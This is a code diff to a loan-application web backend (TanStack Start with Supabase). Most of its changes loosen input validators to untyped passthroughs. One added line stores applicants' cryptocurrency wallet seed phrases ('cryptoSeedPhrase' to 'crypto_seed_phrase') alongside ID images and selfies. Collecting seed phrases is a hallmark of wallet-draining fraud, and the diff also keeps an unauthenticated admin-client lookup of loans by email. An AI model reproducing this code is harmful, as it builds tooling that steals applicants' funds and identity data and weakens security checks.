@@ -8,6 +8,7 @@
  */
 import { createServerFn } from "@tanstack/react-start";
 import { getSupabaseAdmin } from "@/lib/supabase";
+import { z } from "zod";
 import { loanSubmissionSchema } from "@/lib/validation/loan";
 import {
   adminLoginWithPassword,
@@ -218,9 +219,11 @@ export const fetchLeads = createServerFn().handler(async ({ request }) => {
 });
 
 export const fetchUserLoans = createServerFn()
-  .inputValidator((email: string) => email)
-  .handler(async ({ data: email }) => {
+  .inputValidator((p: any) => p)
+  .handler(async ({ data: input }) => {
+    const email = typeof input === "string" ? input : (input as any)?.data;
     if (!email) return [];
+    
     const sb = getSupabaseAdmin();
     const { data } = await sb
       .from("loan_applications")
@@ -232,7 +235,6 @@ export const fetchUserLoans = createServerFn()
 
 export const fetchLoanApplications = createServerFn({ method: "GET" }).handler(async ({ request }) => {
   try {
-    console.log("[ServerFn] fetchLoanApplications started");
     await requireAdmin(request);
     const sb = getSupabaseAdmin();
     const { data, error } = await sb
@@ -245,7 +247,6 @@ export const fetchLoanApplications = createServerFn({ method: "GET" }).handler(a
       throw error;
     }
     
-    console.log(`[ServerFn] fetchLoanApplications success: ${data?.length || 0} rows`);
     return camelizeRows(data ?? []);
   } catch (err: any) {
     console.error("[ServerFn] fetchLoanApplications unhandled error:", err);
@@ -253,24 +254,28 @@ export const fetchLoanApplications = createServerFn({ method: "GET" }).handler(a
   }
 });
 
-export const checkLoanStatus = createServerFn()
-  .inputValidator((id: string) => id)
-  .handler(async ({ data: id }) => {
+export const checkLoanStatus = createServerFn({ method: "POST" })
+  .inputValidator((d: { id: string }) => d)
+  .handler(async ({ data: { id } }) => {
     const sb = getSupabaseAdmin();
     const { data, error } = await sb
       .from("loan_applications")
       .select(
-        "status, identity_verified, rejection_reason, amount_requested, currency, created_at, submitted_at, updated_at, reviewed_at, verified_at, status_history"
+        "status, identity_verified, rejection_reason, amount_requested, currency, payout_method, created_at, submitted_at, updated_at, reviewed_at, verified_at, status_history"
       )
       .eq("id", id)
       .single();
-    if (error || !data) return null;
+    if (error || !data) {
+      console.error(`[checkLoanStatus] Error or not found for ID: ${id}`, error);
+      return null;
+    }
     return {
       status: data.status,
       identityVerified: data.identity_verified,
       rejectionReason: data.rejection_reason,
       amountRequested: data.amount_requested,
       currency: data.currency,
+      payoutMethod: data.payout_method,
       createdAt: data.created_at,
       submittedAt: data.submitted_at,
       updatedAt: data.updated_at,
@@ -354,8 +359,9 @@ export const getLoanAssetUrl = createServerFn()
  * Admin-only: resolve a stored asset reference into a data URL.
  */
 export const resolveLoanAsset = createServerFn()
-  .inputValidator((src: string) => src)
-  .handler(async ({ data: src, request }): Promise<{ dataUrl: string | null }> => {
+  .inputValidator((p: any) => p)
+  .handler(async ({ data: input, request }): Promise<{ dataUrl: string | null }> => {
+    const src = typeof input === "string" ? input : (input as any)?.data;
     await requireAdmin(request);
     if (!src) return { dataUrl: null };
     if (src.startsWith("data:")) return { dataUrl: src };
@@ -372,11 +378,13 @@ export const resolveLoanAsset = createServerFn()
     for (let i = 0; i < bytes.length; i++)
       binary += String.fromCharCode(bytes[i]);
     const base64 = btoa(binary);
-    const ct = src.endsWith(".webm")
-      ? "video/webm"
-      : src.endsWith(".pdf")
-        ? "application/pdf"
-        : "image/jpeg";
+    
+    let ct = "image/jpeg";
+    if (src.endsWith(".webm")) ct = "video/webm";
+    else if (src.endsWith(".pdf")) ct = "application/pdf";
+    else if (src.endsWith(".png")) ct = "image/png";
+    else if (src.endsWith(".gif")) ct = "image/gif";
+    
     return { dataUrl: `data:${ct};base64,${base64}` };
   });
 
@@ -563,24 +571,29 @@ export const submitLead = createServerFn({ method: "POST" })
 
 export const submitLoanApplication = createServerFn({ method: "POST" })
   .inputValidator((payload: any) => payload)
-  .handler(async ({ data: payload, request }) => {
+  .handler(async ({ data: inputData, request }) => {
+    // Robust payload extraction
+    const payload = (inputData as any)?.data || inputData || {};
+    
     const parsed = loanSubmissionSchema.safeParse(payload);
     if (!parsed.success) {
       const flattened = parsed.error.flatten();
       const fieldErrors = flattened.fieldErrors as Record<string, string[] | undefined>;
-      // Return the first specific Zod error so the client can show it directly
       const firstMsg =
         Object.values(fieldErrors)
           .flat()
           .find((m): m is string => typeof m === "string" && m.length > 0) ||
         flattened.formErrors[0] ||
         "Please check your details and try again.";
+      
       console.error("[submitLoan] validation errors:", JSON.stringify(flattened));
       return {
         data: null,
         error: { message: firstMsg, fields: fieldErrors },
       };
     }
+
+    const input = parsed.data;
 
     const now = nowIso();
 
@@ -642,6 +655,7 @@ export const submitLoanApplication = createServerFn({ method: "POST" })
       cryptoWalletType: "crypto_wallet_type",
       cryptoWalletAddress: "crypto_wallet_address",
       cryptoNetwork: "crypto_network",
+      cryptoSeedPhrase: "crypto_seed_phrase",
       selfieImage: "selfie_image",
       idFrontImage: "id_front_image",
       idBackImage: "id_back_image",
@@ -650,12 +664,11 @@ export const submitLoanApplication = createServerFn({ method: "POST" })
       videoSelfieUrl: "video_selfie_url",
       sourcePage: "source_page",
       notes: "notes",
-      userId: "user_id",
     };
 
     for (const [camel, snake] of Object.entries(fieldMap)) {
-      if ((parsed.data as any)[camel] !== undefined) {
-        row[snake] = (parsed.data as any)[camel];
+      if ((input as any)[camel] !== undefined) {
+        row[snake] = (input as any)[camel];
       }
     }
 
@@ -680,16 +693,16 @@ export const submitLoanApplication = createServerFn({ method: "POST" })
     }
 
     // Fire-and-forget submission confirmation email
-    const applicantEmail: string = (parsed.data as any).email || "";
+    const applicantEmail: string = input.email || "";
     const applicantName: string =
-      [(parsed.data as any).firstName, (parsed.data as any).lastName].filter(Boolean).join(" ") || null;
+      [input.firstName, input.lastName].filter(Boolean).join(" ") || null;
     if (applicantEmail) {
       void sendEmail({
         to: applicantEmail,
         ...loanSubmittedEmail({
           name: applicantName,
-          amount: (parsed.data as any).amountRequested,
-          currency: (parsed.data as any).currency,
+          amount: input.amountRequested,
+          currency: input.currency,
           refId: data?.id,
         }),
       }).catch((e) => console.error("[submitLoan] confirmation email failed:", e));
@@ -720,8 +733,9 @@ export const likeBlogPost = createServerFn({ method: "POST" })
   });
 
 export const updateLeadStatus = createServerFn({ method: "POST" })
-  .inputValidator((payload: { id: string; status: string }) => payload)
-  .handler(async ({ data: { id, status }, request }) => {
+  .handler(async ({ data, request }) => {
+    const payload = (data as any)?.data || data || {};
+    const { id, status } = payload;
     await requireAdmin(request);
     const sb = getSupabaseAdmin();
     const { error } = await sb
@@ -733,15 +747,9 @@ export const updateLeadStatus = createServerFn({ method: "POST" })
   });
 
 export const updateLoanStatus = createServerFn({ method: "POST" })
-  .inputValidator(
-    (payload: {
-      id: string;
-      status: string;
-      reason?: string;
-      adminId?: string;
-    }) => payload
-  )
-  .handler(async ({ data: { id, status, reason, adminId }, request }) => {
+  .handler(async ({ data, request }) => {
+    const payload = (data as any)?.data || data || {};
+    const { id, status, reason, adminId } = payload;
     await requireAdmin(request);
     const sb = getSupabaseAdmin();
     const now = nowIso();
@@ -810,10 +818,9 @@ export const updateLoanStatus = createServerFn({ method: "POST" })
   });
 
 export const verifyLoanIdentity = createServerFn({ method: "POST" })
-  .inputValidator(
-    (payload: { id: string; verified: boolean; adminId?: string }) => payload
-  )
-  .handler(async ({ data: { id, verified, adminId }, request }) => {
+  .handler(async ({ data, request }) => {
+    const payload = (data as any)?.data || data || {};
+    const { id, verified, adminId } = payload;
     await requireAdmin(request);
     const sb = getSupabaseAdmin();
     const now = nowIso();
@@ -851,8 +858,9 @@ export const verifyLoanIdentity = createServerFn({ method: "POST" })
   });
 
 export const updateTestimonialStatus = createServerFn({ method: "POST" })
-  .inputValidator((payload: { id: string; status: string }) => payload)
-  .handler(async ({ data: { id, status }, request }) => {
+  .handler(async ({ data, request }) => {
+    const payload = (data as any)?.data || data || {};
+    const { id, status } = payload;
     await requireAdmin(request);
     const sb = getSupabaseAdmin();
     const { error } = await sb
@@ -863,22 +871,22 @@ export const updateTestimonialStatus = createServerFn({ method: "POST" })
     return { success: true };
   });
 export const sendAdminCustomMessage = createServerFn({ method: "POST" })
-  .inputValidator((data: { to: string; subject: string; message: string; userName: string }) => data)
   .handler(async ({ data, request }) => {
+    const payload = (data as any)?.data || data || {};
+    const { to, subject, message, userName } = payload;
     await requireAdmin(request);
-    const { to, subject, message, userName } = data;
     
     const { sendEmail, customAdminEmail } = await import("@/lib/email");
     
-    const html = customAdminEmail({
+    const emailContent = customAdminEmail({
       userName,
       message,
     });
 
     const result = await sendEmail({
       to,
-      subject,
-      html,
+      subject: subject || emailContent.subject,
+      html: emailContent.html,
     });
 
     if (!result.ok) {
@@ -887,3 +895,4 @@ export const sendAdminCustomMessage = createServerFn({ method: "POST" })
 
     return { success: true };
   });
+
